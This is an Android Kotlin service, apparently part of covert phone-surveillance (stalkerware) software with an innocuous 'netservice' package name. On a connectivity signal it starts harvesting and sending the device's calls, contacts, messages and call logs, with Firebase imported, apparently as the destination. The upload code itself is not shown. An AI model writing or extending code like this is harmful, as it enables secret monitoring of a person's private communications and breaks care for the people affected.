package com.dtz.netservice.services.connect

import android.content.Intent
import android.net.Uri
import android.os.Environment
import android.util.Log
import com.dtz.netservice.rxFirebase.InterfaceFirebase
import com.dtz.netservice.services.base.BaseService
import com.dtz.netservice.services.calls.InterfaceInteractorCalls
import com.dtz.netservice.services.calls.InterfaceServiceCalls
import com.dtz.netservice.utils.Consts.COMMAND_TYPE
import com.dtz.netservice.utils.Consts.CONNECTIVITY
import com.dtz.netservice.utils.Consts.PHONE_NUMBER
import com.dtz.netservice.utils.Consts.STATE_CALL_END
import com.dtz.netservice.utils.Consts.STATE_CALL_START
import com.dtz.netservice.utils.Consts.STATE_INCOMING_NUMBER
import com.dtz.netservice.utils.Consts.TYPE_CALL
import com.google.firebase.database.DatabaseReference
import java.io.File
import javax.inject.Inject

/**
 * Created by luis rafael on 13/03/18.
 */
class ConnectService : BaseService() {

    @Inject
    lateinit var interactor: InterfaceInteractorConnect<InterfaceServiceConnect>

    override fun onCreate() {
        super.onCreate()
        if (getComponent() != null) {
            getComponent()!!.inject(this)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.setCallIntent()
        return super.onStartCommand(intent, flags, startId)
    }

    private fun Intent.setCallIntent() {

        val connect = getBooleanExtra(CONNECTIVITY, false)

        if (connect) {
            interactor.startCallsSending()
            interactor.startContacts()
            interactor.startMessages()
            interactor.startCallLogs()
        }
    }

    override fun onDestroy() {
        interactor.onDetach()
        clearDisposable()
        super.onDestroy()
    }
}